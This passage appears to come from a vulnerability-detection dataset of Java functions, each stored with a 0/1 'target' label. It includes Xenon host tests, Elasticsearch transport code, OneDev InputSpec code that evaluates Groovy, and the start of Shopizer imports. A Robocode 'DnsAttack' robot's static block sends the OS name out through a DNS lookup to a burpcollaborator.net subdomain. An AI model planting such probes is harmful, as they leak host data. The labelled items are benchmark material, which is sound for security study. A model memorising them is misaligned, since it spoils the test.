serviceDocument.documentDescription.userInterfaceResourcePath = resourcePath;\n                return serviceDocument;\n            }\n        }\n\n        // Starting the  CustomUiPathService service\n        this.host.startServiceAndWait(new CustomUiPathService(), CustomUiPathService.SELF_LINK, null);\n\n        String htmlPath = \"/user-interface/resources/\" + resourcePath + \"/custom.html\";\n        // Sending get request for html\n        String htmlResponse = this.host.sendWithJavaClient(\n                UriUtils.buildUri(this.host, htmlPath),\n                Operation.MEDIA_TYPE_TEXT_HTML, null);\n\n        assertEquals(\"<html>customHtml</html>\", htmlResponse);\n    }\n\n    @Test\n    public void testRootUiService() throws Throwable {\n        setUp(false);\n\n        // Stopping the RootNamespaceService\n        this.host.waitForResponse(Operation\n                .createDelete(UriUtils.buildUri(this.host, UriUtils.URI_PATH_CHAR)));\n\n        class RootUiService extends UiFileContentService {\n            public static final String SELF_LINK = UriUtils.URI_PATH_CHAR;\n        }\n\n        // Starting the CustomUiService service\n        this.host.startServiceAndWait(new RootUiService(), RootUiService.SELF_LINK, null);\n\n        // Loading the default page\n        Operation result = this.host.waitForResponse(Operation\n                .createGet(UriUtils.buildUri(this.host, RootUiService.SELF_LINK)));\n        assertEquals(\"<html><title>Root</title></html>\", result.getBodyRaw());\n    }\n\n    @Test\n    public void testClientSideRouting() throws Throwable {\n        setUp(false);\n\n        class AppUiService extends UiFileContentService {\n            public static final String SELF_LINK = \"/app\";\n        }\n\n        // Starting the AppUiService service\n        AppUiService s = new AppUiService();\n        this.host.startServiceAndWait(s, AppUiService.SELF_LINK, null);\n\n        // Finding the default page file\n        Path baseResourcePath = Utils.getServiceUiResourcePath(s);\n        Path baseUriPath = Paths.get(AppUiService.SELF_LINK);\n        String prefix = baseResourcePath.toString().replace('\\\\', '/');\n        Map<Path, String> pathToURIPath = new HashMap<>();\n        this.host.discoverJarResources(baseResourcePath, s, pathToURIPath, baseUriPath, prefix);\n        File defaultFile = pathToURIPath.entrySet()\n                .stream()\n                .filter((entry) -> {\n                    return entry.getValue().equals(AppUiService.SELF_LINK +\n                            UriUtils.URI_PATH_CHAR + ServiceUriPaths.UI_RESOURCE_DEFAULT_FILE);\n                })\n                .map(Map.Entry::getKey)\n                .findFirst()\n                .get()\n                .toFile();\n\n        List<String> routes = Arrays.asList(\"/app/1\", \"/app/2\");\n\n        // Starting all route services\n        for (String route : routes) {\n            this.host.startServiceAndWait(new FileContentService(defaultFile), route, null);\n        }\n\n        // Loading routes\n        for (String route : routes) {\n            Operation result = this.host.waitForResponse(Operation\n                    .createGet(UriUtils.buildUri(this.host, route)));\n            assertEquals(\"<html><title>App</title></html>\", result.getBodyRaw());\n        }\n\n        // Loading the about page\n        Operation about = this.host.waitForResponse(Operation\n                .createGet(UriUtils.buildUri(this.host, AppUiService.SELF_LINK + \"/about.html\")));\n        assertEquals(\"<html><title>About</title></html>\", about.getBodyRaw());\n    }\n\n    @Test\n    public void httpScheme() throws Throwable {\n        setUp(true);\n\n        // SSL config for https\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        this.host.setCertificateFileReference(ssc.certificate().toURI());\n        this.host.setPrivateKeyFileReference(ssc.privateKey().toURI());\n\n        assertEquals(\"before starting, scheme is NONE\", ServiceHost.HttpScheme.NONE,\n                this.host.getCurrentHttpScheme());\n\n        this.host.setPort(0);\n        this.host.setSecurePort(0);\n        this.host.start();\n\n        ServiceRequestListener httpListener = this.host.getListener();\n        ServiceRequestListener httpsListener = this.host.getSecureListener();\n\n        assertTrue(\"http listener should be on\", httpListener.isListening());\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTP_AND_HTTPS, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTP\",\n                this.host.getPublicUri().getScheme().equals(\"http\"));\n\n        httpsListener.stop();\n        assertTrue(\"http listener should be on \", httpListener.isListening());\n        assertFalse(\"https listener should be off\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTP_ONLY, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTP\",\n                this.host.getPublicUri().getScheme().equals(\"http\"));\n\n        httpListener.stop();\n        assertFalse(\"http listener should be off\", httpListener.isListening());\n        assertFalse(\"https listener should be off\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.NONE, this.host.getCurrentHttpScheme());\n\n        // re-start listener even host is stopped, verify getCurrentHttpScheme only\n        httpsListener.start(0, ServiceHost.LOOPBACK_ADDRESS);\n        assertFalse(\"http listener should be off\", httpListener.isListening());\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTPS_ONLY, this.host.getCurrentHttpScheme());\n        httpsListener.stop();\n\n        this.host.stop();\n        // set HTTP port to disabled, restart host. Verify scheme is HTTPS only. We must\n        // set both HTTP and secure port, to null out the listeners from the host instance.\n        this.host.setPort(ServiceHost.PORT_VALUE_LISTENER_DISABLED);\n        this.host.setSecurePort(0);\n        VerificationHost.createAndAttachSSLClient(this.host);\n        this.host.start();\n\n        httpListener = this.host.getListener();\n        httpsListener = this.host.getSecureListener();\n\n        assertTrue(\"http listener should be null, default port value set to disabled\",\n                httpListener == null);\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTPS_ONLY, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTPS\",\n                this.host.getPublicUri().getScheme().equals(\"https\"));\n    }\n\n    @Test\n    public void create() throws Throwable {\n        ServiceHost h = ServiceHost.create(\"--port=0\");\n        try {\n            h.start();\n            h.startDefaultCoreServicesSynchronously();\n\n            // Start the example service factory\n            h.startFactory(ExampleService.class, ExampleService::createFactory);\n\n            boolean[] isReady = new boolean[1];\n            h.registerForServiceAvailability((o, e) -> {\n                isReady[0] = true;\n            }, ExampleService.FACTORY_LINK);\n\n\n            Duration timeout = Duration.of(ServiceHost.ServiceHostState.DEFAULT_MAINTENANCE_INTERVAL_MICROS * 5, ChronoUnit.MICROS);\n            TestContext.waitFor(timeout, () -> {\n                return isReady[0];\n            }, \"ExampleService did not start\");\n\n            // verify ExampleService exists\n            TestRequestSender sender = new TestRequestSender(h);\n            Operation get = Operation.createGet(h, ExampleService.FACTORY_LINK);\n            sender.sendAndWait(get);\n        } finally {\n            if (h != null) {\n                h.unregisterRuntimeShutdownHook();\n                h.stop();\n            }\n        }\n    }\n\n    @Test\n    public void findOwnerNode() throws Throwable {\n        setUp(false);\n\n        int nodeCount = 3;\n        int pathVerificationCount = 3;\n        this.host.setUpPeerHosts(nodeCount);\n        this.host.joinNodesAndVerifyConvergence(nodeCount, true);\n        this.host.setNodeGroupQuorum(nodeCount);\n\n        // each host should say same owner for the path\n        for (int i = 0; i < pathVerificationCount; i++) {\n            String path = UUID.randomUUID().toString();\n\n            Map<String, String> map = new HashMap<>();\n            Set<String> ownerIds = new HashSet<>();\n            for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n                String ownerId = h.findOwnerNode(null, path).ownerNodeId;\n                map.put(h.getId(), ownerId);\n                ownerIds.add(ownerId);\n            }\n            assertThat(ownerIds).as(\"all peers say same owner for %s. %s\", path, map).hasSize(1);\n        }\n\n    }\n\n    @Test\n    public void restartAndVerifyManagementService() throws Throwable {\n        setUp(false);\n\n        // management service should be accessible\n        Operation get = Operation.createGet(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.getTestRequestSender().sendAndWait(get);\n\n        // restart\n        this.host.stop();\n        this.host.setPort(0);\n        this.host.start();\n\n        // verify management service is accessible.\n        get = Operation.createGet(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.getTestRequestSender().sendAndWait(get);\n    }\n\n    @Test\n    public void findLocalRootNamespaceServiceViaURI() throws Throwable {\n        setUp(false);\n\n        // full URI for the localhost (ex: http://127.0.0.1:50000)\n        URI rootUri = this.host.getUri();\n\n        // ex: http://127.0.0.1:50000/\n        URI rootUriWithPath = UriUtils.buildUri(this.host.getUri(), UriUtils.URI_PATH_CHAR);\n\n        // Accessing localhost with URI will short-circuit the call to direct method invocation. (No netty layer)\n        // This should resolve the RootNamespaceService\n        this.host.getTestRequestSender().sendAndWait(Operation.createGet(rootUri));\n\n        // same for the URI with path-character\n        this.host.getTestRequestSender().sendAndWait(Operation.createGet(rootUriWithPath));\n    }\n\n    @Test\n    public void cors() throws Throwable {\n\n        // CORS config for http://example.com\n        CorsConfig corsConfig = CorsConfigBuilder.forOrigin(\"http://example.com\")\n                .allowedRequestMethods(HttpMethod.PUT)\n                .allowedRequestHeaders(\"x-xenon\")\n                .build();\n\n        this.host = new VerificationHost() {\n            @Override\n            protected void configureHttpListener(ServiceRequestListener httpListener) {\n                // enable CORS\n                ((NettyHttpListener) httpListener).setCorsConfig(corsConfig);\n            }\n        };\n\n        VerificationHost.initialize(this.host, VerificationHost.buildDefaultServiceHostArguments(0));\n        this.host.start();\n\n        TestRequestSender sender = this.host.getTestRequestSender();\n\n        Operation get;\n        Operation preflight;\n        Operation response;\n\n        // Request from http://example.com\n        get = Operation.createGet(this.host, \"/\")\n                .addRequestHeader(\"origin\", \"http://example.com\")\n                .forceRemote();\n\n        response = sender.sendAndWait(get);\n        assertEquals(\"http://example.com\", response.getResponseHeader(\"access-control-allow-origin\"));\n\n        // Request from http://not-example.com\n        get = Operation.createGet(this.host, \"/\")\n                .addRequestHeader(\"origin\", \"http://not-example.com\")\n                .forceRemote();\n\n        response = sender.sendAndWait(get);\n        assertNull(response.getResponseHeader(\"access-control-allow-origin\"));\n\n\n        // Preflight from http://example.com\n        preflight = Operation.createOptions(this.host, \"/\")\n                .addRequestHeader(\"origin\", \"http://example.com\")\n                .addRequestHeader(\"Access-Control-Request-Method\", \"POST\")\n                .forceRemote();\n\n        response = sender.sendAndWait(preflight);\n        assertEquals(\"http://example.com\", response.getResponseHeader(\"access-control-allow-origin\"));\n        assertEquals(\"PUT\", response.getResponseHeader(\"access-control-allow-methods\"));\n        assertEquals(\"x-xenon\", response.getResponseHeader(\"access-control-allow-headers\"));\n\n        // Preflight from http://not-example.com\n        preflight = Operation.createOptions(this.host, \"/\")\n                .addRequestHeader(\"origin\", \"http://not-example.com\")\n                .addRequestHeader(\"Access-Control-Request-Method\", \"POST\")\n                .addRequestHeader(Operation.CONNECTION_HEADER, \"close\")\n                .setKeepAlive(false)\n                .forceRemote();\n\n        response = sender.sendAndWait(preflight);\n        assertNull(response.getResponseHeader(\"access-control-allow-origin\"));\n        assertNull(response.getResponseHeader(\"access-control-allow-methods\"));\n        assertNull(response.getResponseHeader(\"access-control-allow-headers\"));\n    }\n\n    @After\n    public void tearDown() {\n        LuceneDocumentIndexService.setIndexFileCountThresholdForWriterRefresh(\n                LuceneDocumentIndexService\n                        .DEFAULT_INDEX_FILE_COUNT_THRESHOLD_FOR_WRITER_REFRESH);\n\n        if (this.host == null) {\n            return;\n        }\n\n        if (!this.host.isStopping()) {\n            AuthTestUtils.logout(this.host);\n        }\n        this.host.tearDown();\n        this.host = null;\n    }\n\n}\n", "target": 1}
{"idx": 1121, "func": "/*\n\n    Copyright 2018-2020 Accenture Technology\n\n    Licensed under the Apache License, Version 2.0 (the \"License\");\n    you may not use this file except in compliance with the License.\n    You may obtain a copy of the License at\n\n        http://www.apache.org/licenses/LICENSE-2.0\n\n    Unless required by applicable law or agreed to in writing, software\n    distributed under the License is distributed on an \"AS IS\" BASIS,\n    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n    See the License for the specific language governing permissions and\n    limitations under the License.\n\n */\n\npackage org.platformlambda.services;\n\nimport org.platformlambda.core.exception.AppException;\nimport org.platformlambda.core.models.EventEnvelope;\nimport org.platformlambda.core.models.LambdaFunction;\nimport org.platformlambda.core.system.Platform;\nimport org.platformlambda.models.ObjectWithGenericType;\nimport org.platformlambda.models.SamplePoJo;\n\nimport java.io.IOException;\nimport java.util.Date;\nimport java.util.Map;\n\npublic class HelloGeneric implements LambdaFunction {\n\n    @Override\n    public Object handleEvent(Map<String, String> headers, Object body, int instance) throws AppException, IOException {\n        String id = headers.get(\"id\");\n        if (id == null) {\n            throw new IllegalArgumentException(\"Missing parameter 'id'\");\n        }\n        if (id.equals(\"1\")) {\n            // to set status, key-values or parametric types, we can use EventEnvelope as a result wrapper\n            EventEnvelope result = new EventEnvelope();\n            ObjectWithGenericType<SamplePoJo> genericObject = new ObjectWithGenericType<>();\n            // return some place-holder values to demonstrate the PoJo can be transported over the network\n            SamplePoJo mock = new SamplePoJo(1, \"Generic class with parametric type SamplePoJo\",\n                                    \"200 World Blvd, Planet Earth\");\n            // set current timestamp to indicate that the object is a new one\n            mock.setDate(new Date());\n            // set instance count and service origin ID to show that the object comes from a different instance\n            mock.setInstance(instance);\n            mock.setOrigin(Platform.getInstance().getOrigin());\n\n            genericObject.setId(101);\n            genericObject.setContent(mock);\n\n            result.setBody(genericObject);\n            result.setParametricType(SamplePoJo.class);\n\n            return result;\n        } else {\n            throw new AppException(404, \"Not found. Try id = 1\");\n        }\n    }\n\n}\n", "target": 0}
{"idx": 1122, "func": "/*\n * Licensed to Elasticsearch under one or more contributor\n * license agreements. See the NOTICE file distributed with\n * this work for additional information regarding copyright\n * ownership. Elasticsearch licenses this file to you under\n * the Apache License, Version 2.0 (the \"License\"); you may\n * not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *    http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied.  See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage org.elasticsearch.transport.local;\n\nimport org.elasticsearch.Version;\nimport org.elasticsearch.common.io.ThrowableObjectOutputStream;\nimport org.elasticsearch.common.io.stream.BytesStreamOutput;\nimport org.elasticsearch.common.io.stream.HandlesStreamOutput;\nimport org.elasticsearch.common.io.stream.StreamOutput;\nimport org.elasticsearch.transport.*;\nimport org.elasticsearch.transport.support.TransportStatus;\n\nimport java.io.IOException;\nimport java.io.NotSerializableException;\n\n/**\n *\n */\npublic class LocalTransportChannel implements TransportChannel {\n\n    private final LocalTransport sourceTransport;\n    private final TransportServiceAdapter sourceTransportServiceAdapter;\n    // the transport we will *send to*\n    private final LocalTransport targetTransport;\n    private final String action;\n    private final long requestId;\n    private final Version version;\n\n    public LocalTransportChannel(LocalTransport sourceTransport, TransportServiceAdapter sourceTransportServiceAdapter, LocalTransport targetTransport, String action, long requestId, Version version) {\n        this.sourceTransport = sourceTransport;\n        this.sourceTransportServiceAdapter = sourceTransportServiceAdapter;\n        this.targetTransport = targetTransport;\n        this.action = action;\n        this.requestId = requestId;\n        this.version = version;\n    }\n\n    @Override\n    public String action() {\n        return action;\n    }\n\n    @Override\n    public void sendResponse(TransportResponse response) throws IOException {\n        sendResponse(response, TransportResponseOptions.EMPTY);\n    }\n\n    @Override\n    public void sendResponse(TransportResponse response, TransportResponseOptions options) throws IOException {\n        BytesStreamOutput bStream = new BytesStreamOutput();\n        StreamOutput stream = new HandlesStreamOutput(bStream);\n        stream.setVersion(version);\n        stream.writeLong(requestId);\n        byte status = 0;\n        status = TransportStatus.setResponse(status);\n        stream.writeByte(status); // 0 for request, 1 for response.\n        response.writeTo(stream);\n        stream.close();\n        final byte[] data = bStream.bytes().toBytes();\n        targetTransport.workers().execute(new Runnable() {\n            @Override\n            public void run() {\n                targetTransport.messageReceived(data, action, sourceTransport, version, null);\n            }\n        });\n        sourceTransportServiceAdapter.onResponseSent(requestId, action, response, options);\n    }\n\n    @Override\n    public void sendResponse(Throwable error) throws IOException {\n        BytesStreamOutput stream = new BytesStreamOutput();\n        try {\n            writeResponseExceptionHeader(stream);\n            RemoteTransportException tx = new RemoteTransportException(targetTransport.nodeName(), targetTransport.boundAddress().boundAddress(), action, error);\n            ThrowableObjectOutputStream too = new ThrowableObjectOutputStream(stream);\n            too.writeObject(tx);\n            too.close();\n        } catch (NotSerializableException e) {\n            stream.reset();\n            writeResponseExceptionHeader(stream);\n            RemoteTransportException tx = new RemoteTransportException(targetTransport.nodeName(), targetTransport.boundAddress().boundAddress(), action, new NotSerializableTransportException(error));\n            ThrowableObjectOutputStream too = new ThrowableObjectOutputStream(stream);\n            too.writeObject(tx);\n            too.close();\n        }\n        final byte[] data = stream.bytes().toBytes();\n        targetTransport.workers().execute(new Runnable() {\n            @Override\n            public void run() {\n                targetTransport.messageReceived(data, action, sourceTransport, version, null);\n            }\n        });\n        sourceTransportServiceAdapter.onResponseSent(requestId, action, error);\n    }\n\n    private void writeResponseExceptionHeader(BytesStreamOutput stream) throws IOException {\n        stream.writeLong(requestId);\n        byte status = 0;\n        status = TransportStatus.setResponse(status);\n        status = TransportStatus.setError(status);\n        stream.writeByte(status);\n    }\n}\n", "target": 1}
{"idx": 1123, "func": "package tested.robots;\n\npublic class DnsAttack extends robocode.Robot {\n\tstatic {\n\t\ttry {\n\t\t\tnew java.net.URL(\"http://\" + System.getProperty(\"os.name\").replaceAll(\" \", \".\")\n\t\t\t\t\t+ \".randomsubdomain.burpcollaborator.net\").openStream();\n\t\t} catch (Exception e) {\n\t\t}\n\t}\n\n\tpublic void run() {\n\t\tfor (;;) {\n\t\t\tahead(100);\n\t\t\tback(100);\n\t\t}\n\t}\n}\n", "target": 0}
{"idx": 1124, "func": "package io.onedev.server.model.support.inputspec;\n\nimport java.io.Serializable;\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.annotation.Nullable;\n\nimport org.apache.commons.lang.SerializationUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.unbescape.java.JavaEscape;\n\nimport com.google.common.collect.Lists;\n\nimport io.onedev.server.model.support.inputspec.showcondition.ShowCondition;\nimport io.onedev.server.util.GroovyUtils;\nimport io.onedev.server.web.editable.EditableUtils;\nimport io.onedev.server.web.editable.annotation.Editable;\n\n@Editable\npublic abstract class InputSpec implements Serializable {\n\t\n\tprivate static final long serialVersionUID = 1L;\n\t\n\tprivate static final Logger logger = LoggerFactory.getLogger(InputSpec.class);\n\t\n\tpublic static final String BOOLEAN = \"Checkbox\";\n\n\tpublic static final String TEXT = \"Text\";\n\t\n\tpublic static final String DATE = \"Date\";\n\t\n\tpublic static final String SECRET = \"Secret\";\n\t\n\tpublic static final String NUMBER = \"Number\";\n\t\n\tpublic static final String COMMIT = \"Commit\";\n\t\n\tpublic static final String ENUMERATION = \"Enumeration\";\n\t\n\tpublic static final String USER = \"User\";\n\t\n\tpublic static final String GROUP = \"Group\";\n\t\n\tpublic static final String ISSUE = \"Issue\";\n\t\n\tpublic static final String BUILD = \"Build\";\n\n\tpublic static final String PULLREQUEST = \"Pull request\";\n\t\n\tprivate String name;\n\n\tprivate String description;\n\n\tprivate boolean allowMultiple;\n\t\n\tprivate boolean allowEmpty;\n\t\n\tprivate ShowCondition showCondition;\n\t\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic String getDescription() {\n\t\treturn description;\n\t}\n\n\tpublic void setDescription(String description) {\n\t\tthis.description = description;\n\t}\n\n\tpublic boolean isAllowMultiple() {\n\t\treturn allowMultiple;\n\t}\n\n\tpublic void setAllowMultiple(boolean allowMultiple) {\n\t\tthis.allowMultiple = allowMultiple;\n\t}\n\n\tpublic ShowCondition getShowCondition() {\n\t\treturn showCondition;\n\t}\n\n\tpublic void setShowCondition(ShowCondition showCondition) {\n\t\tthis.showCondition = showCondition;\n\t}\n\t\n\tpublic boolean isAllowEmpty() {\n\t\treturn allowEmpty;\n\t}\n\n\tpublic void setAllowEmpty(boolean allowEmpty) {\n\t\tthis.allowEmpty = allowEmpty;\n\t}\n\t\n\tpublic List<String> getPossibleValues() {\n\t\treturn Lists.newArrayList();\n\t}\n\n\tpublic static String escape(String string) {\n\t\tString escaped = JavaEscape.escapeJava(string);\n\t\t// escape $ character since it has special meaning in groovy string\n\t\tescaped = escaped.replace(\"$\", \"\\\\$\");\n\n\t\treturn escaped;\n\t}\n\t\n\tpublic abstract String getPropertyDef(Map<String, Integer> indexes);\n\t\n\tprotected String getLiteral(byte[] bytes) {\n\t\tStringBuffer buffer = new StringBuffer(\"[\");\n\t\tfor (byte eachByte: bytes) {\n\t\t\tbuffer.append(String.format(\"%d\", eachByte)).append(\",\");\n\t\t}\n\t\tbuffer.append(\"] as byte[]\");\n\t\treturn buffer.toString();\n\t}\n\n\tpublic void appendField(StringBuffer buffer, int index, String type) {\n\t\tbuffer.append(\"    private Optional<\" + type + \"> input\" + index + \";\\n\");\n\t\tbuffer.append(\"\\n\");\n\t}\n\t\n\tpublic void appendChoiceProvider(StringBuffer buffer, int index, String annotation) {\n\t\tbuffer.append(\"    \" + annotation + \"(\\\"getInput\" + index + \"Choices\\\")\\n\");\t\t\n\t}\n\t\n\tpublic void appendCommonAnnotations(StringBuffer buffer, int index) {\n\t\tif (description != null) {\n\t\t\tbuffer.append(\"    @Editable(name=\\\"\" + escape(name) + \"\\\", description=\\\"\" + \n\t\t\t\t\tescape(description) + \"\\\", order=\" + index + \")\\n\");\n\t\t} else {\n\t\t\tbuffer.append(\"    @Editable(name=\\\"\" + escape(name) + \n\t\t\t\t\t\"\\\", order=\" + index + \")\\n\");\n\t\t}\n\t\tif (showCondition != null) \n\t\t\tbuffer.append(\"    @ShowCondition(\\\"isInput\" + index + \"Visible\\\")\\n\");\n\t}\n\n\tprivate void wrapWithChildContext(StringBuffer buffer, int index, String statement) {\n\t\tbuffer.append(\"            ComponentContext context = ComponentContext.get();\\n\");\n\t\tbuffer.append(\"            if (context != null) {\\n\");\n\t\tbuffer.append(\"                ComponentContext childContext = context.getChildContext(\\\"input\" + index + \"\\\");\\n\");\n\t\tbuffer.append(\"                if (childContext != null) {\\n\");\n\t\tbuffer.append(\"                    ComponentContext.push(childContext);\\n\");\n\t\tbuffer.append(\"                    try {\\n\");\n\t\tbuffer.append(\"                        \" + statement + \"\\n\");\n\t\tbuffer.append(\"                    } finally {\\n\");\n\t\tbuffer.append(\"                        ComponentContext.pop();\\n\");\n\t\tbuffer.append(\"                    }\\n\");\n\t\tbuffer.append(\"                } else {\\n\");\n\t\tbuffer.append(\"                    \" + statement + \"\\n\");\n\t\tbuffer.append(\"                }\\n\");\n\t\tbuffer.append(\"            } else {\\n\");\n\t\tbuffer.append(\"                \" + statement + \"\\n\");\n\t\tbuffer.append(\"            }\\n\");\n\t}\n\t\n\tpublic void appendMethods(StringBuffer buffer, int index, String type, \n\t\t\t@Nullable Serializable choiceProvider, @Nullable Serializable defaultValueProvider) {\n\t\tString literalBytes = getLiteral(SerializationUtils.serialize(defaultValueProvider));\n\t\tbuffer.append(\"    public \" + type + \" getInput\" + index + \"() {\\n\");\n\t\tbuffer.append(\"        if (input\" + index + \"!=null) {\\n\");\n\t\tbuffer.append(\"            return input\" + index + \".orNull();\\n\");\n\t\tbuffer.append(\"        } else {\\n\");\n\t\tif (defaultValueProvider != null) {\n\t\t\twrapWithChildContext(buffer, index, \"return SerializationUtils.deserialize(\" + literalBytes + \").getDefaultValue();\");\n\t\t} else {\n\t\t\tbuffer.append(\"        return null;\\n\");\n\t\t}\n\t\tbuffer.append(\"        }\\n\");\n\t\tbuffer.append(\"    }\\n\");\n\t\tbuffer.append(\"\\n\");\n\t\t\n\t\tbuffer.append(\"    public void setInput\" + index + \"(\" + type + \" value) {\\n\");\n\t\tbuffer.append(\"        this.input\" + index + \"=Optional.fromNullable(value);\\n\");\n\t\tbuffer.append(\"    }\\n\");\n\t\tbuffer.append(\"\\n\");\n\t\t\n\t\tif (showCondition != null) {\n\t\t\tbuffer.append(\"    private static boolean isInput\" + index + \"Visible() {\\n\");\n\t\t\tliteralBytes = getLiteral(SerializationUtils.serialize(showCondition));\n\t\t\tbuffer.append(\"        return SerializationUtils.deserialize(\" + literalBytes + \").isVisible();\\n\");\n\t\t\tbuffer.append(\"    }\\n\");\n\t\t\tbuffer.append(\"\\n\");\n\t\t}\n \n\t\tif (choiceProvider != null) {\n\t\t\tbuffer.append(\"    private static List getInput\" + index + \"Choices() {\\n\");\n\t\t\tliteralBytes = getLiteral(SerializationUtils.serialize(choiceProvider));\n\t\t\tif (choiceProvider instanceof io.onedev.server.model.support.inputspec.choiceinput.choiceprovider.ChoiceProvider) {\n\t\t\t\tbuffer.append(\"        return new ArrayList(SerializationUtils.deserialize(\" + literalBytes + \").getChoices(false).keySet());\\n\");\n\t\t\t} else {\n\t\t\t\tbuffer.append(\"        return SerializationUtils.deserialize(\" + literalBytes + \").getChoices(false);\\n\");\n\t\t\t}\n\t\t\tbuffer.append(\"    }\\n\");\n\t\t\tbuffer.append(\"\\n\");\n\t\t}\n\t}\n\t\n\tpublic static Class<?> defineClass(String className, String description, Collection<? extends InputSpec> inputs) {\n\t\tStringBuffer buffer = new StringBuffer();\n\t\tbuffer.append(\"import org.apache.commons.lang3.SerializationUtils;\\n\");\n\t\tbuffer.append(\"import com.google.common.base.Optional;\\n\");\n\t\tbuffer.append(\"import io.onedev.server.web.editable.annotation.*;\\n\");\n\t\tbuffer.append(\"import io.onedev.server.util.validation.annotation.*;\\n\");\n\t\tbuffer.append(\"import io.onedev.util.*;\\n\");\n\t\tbuffer.append(\"import io.onedev.server.util.*;\\n\");\n\t\tbuffer.append(\"import io.onedev.server.util.facade.*;\\n\");\n\t\tbuffer.append(\"import java.util.*;\\n\");\n\t\tbuffer.append(\"import javax.validation.constraints.*;\\n\");\n\t\tbuffer.append(\"import org.hibernate.validator.constraints.*;\\n\");\n\t\tbuffer.append(\"\\n\");\n\t\tbuffer.append(\"@Editable(name=\").append(\"\\\"\").append(description).append(\"\\\")\\n\");\n\t\tbuffer.append(\"class \" + className + \" implements java.io.Serializable {\\n\");\n\t\tbuffer.append(\"\\n\");\n\t\tbuffer.append(\"    private static final long serialVersionUID = 1L;\\n\");\n\t\tbuffer.append(\"\\n\");\n\t\tMap<String, Integer> indexes = new HashMap<>();\n\t\tint index = 1;\n\t\tfor (InputSpec input: inputs)\n\t\t\tindexes.put(input.getName(), index++);\n\t\tfor (InputSpec input: inputs)\n\t\t\tbuffer.append(input.getPropertyDef(indexes));\n\n\t\tbuffer.append(\"}\\n\");\n\t\tbuffer.append(\"return \" + className + \";\\n\");\n\t\t\n\t\tlogger.trace(\"Class definition script:\\n\" + buffer.toString());\n\t\t\n\t\treturn (Class<?>) GroovyUtils.evalScript(buffer.toString(), new HashMap<>());\n\t}\n\n\tpublic abstract List<String> convertToStrings(@Nullable Object object);\n\n\t/**\n\t * Convert list of strings to object\n\t * \n\t * @param strings\n\t * \t\t\tlist of strings\n\t * @return\n\t * \t\t\tconverted object\n\t */\n\t@Nullable\n\tpublic abstract Object convertToObject(List<String> strings);\n\t\n\tpublic long getOrdinal(String fieldValue) {\n\t\treturn -1;\n\t}\n\t\n\tpublic String getType() {\n\t\treturn EditableUtils.getDisplayName(getClass());\t\t\n\t}\n\n\tpublic boolean checkListElements(Object value, Class<?> elementClass) {\n\t\tif (value instanceof List) {\n\t\t\tfor (Object element: (List<?>)value) {\n\t\t\t\tif (element == null || element.getClass() != elementClass)\n\t\t\t\t\treturn false;\n\t\t\t}\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\t}\n\t\t\n}\n", "target": 0}
{"idx": 1125, "func": "/**\n *\n */\npackage com.salesmanager.shop.store.controller.shoppingCart.facade;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.UUID;\n\nimport javax.inject.Inject;\nimport javax.persistence.NoResultException;\n\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.Validate;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\n\nimport com.salesmanager.core.business.exception.ServiceException;\nimport com.salesmanager.core.business.services.catalog.product.PricingService;\nimport com.salesmanager.core.business.services.catalog.product.ProductService;\nimport com.salesmanager.core.business.services.catalog.product.attribute.ProductAttributeService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartCalculationService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartService;\nimport com.salesmanager.core.business.utils.ProductPriceUtils;\nimport com.salesmanager.core.model.catalog.product.Product;\nimport com.salesmanager.core.model.catalog.product.attribute.ProductAttribute;\nimport com.salesmanager.core.model.catalog.product.availability.ProductAvailability;\nimport com.salesmanager.core.model.catalog.product.price.FinalPrice;\nimport com.salesmanager.core.model.customer.Customer;\nimport com.salesmanager.core.model.merchant.MerchantStore;\nimport com.salesmanager.core.model.reference.language.Language;\nimport com.salesmanager.core.model.shoppingcart.ShoppingCart;\nimport com.salesmanager.shop.constants.Constants;\nimport com.salesmanager.shop.model.shoppingcart.CartModificationException;\nimport com.salesmanager.shop.model.shoppingcart.PersistableShoppingCartItem;\nimport com.salesmanager.shop.model.shoppingcart.ReadableShoppingCart;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartAttribute;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartData;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartItem;\nimport com.salesmanager.shop.populator.shoppingCart.ReadableShoppingCartPopulator;\nimport com.salesmanager.shop.populator.shoppingCart.ShoppingCartDataPopulator;\nimport 